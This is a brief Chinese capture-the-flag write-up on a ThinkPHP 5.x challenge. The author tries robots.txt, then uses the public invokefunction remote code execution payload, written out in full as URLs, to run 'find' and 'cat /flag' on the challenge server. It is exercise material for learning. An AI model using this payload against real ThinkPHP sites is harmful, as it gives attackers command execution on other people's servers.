# php_rce

## 解题思路：

- 首先打开网页，写的是think PHP 5 的相关东西，先按老办法试一下index.php  robots.txt有什么东西。

- 没有什么有价值的东西，于是开始考虑think PHP 5 自身的漏洞

- 上网查找，发现确实有一个命令执行漏洞，还刚好是think PHP 5.x 的，那看来是没跑儿了，直接拿payload过来用：

    `111.198.29.45:30506/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=命令语句`

- `system&vars[1][]=` 后面直接接要执行的命令语句就行，先试试能不能找到名字叫flag的东西： `find%20/%20-name%20'flag'`

- 发现还真有，服务器回应：

    `/flag /flag`

- 接下来就简单了，直接 `cat` 让它输出出来就行：

    `111.198.29.45:30506/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`

- 服务器返回flag值，搞定。

## 学到的东西：

- think PHP 5 的相关命令执行漏洞，看了一下大牛们的分析过程，没完全看懂，明天先把它的流程捋一遍：[流程](https://www.cnblogs.com/r00tuser/p/10103329.html)。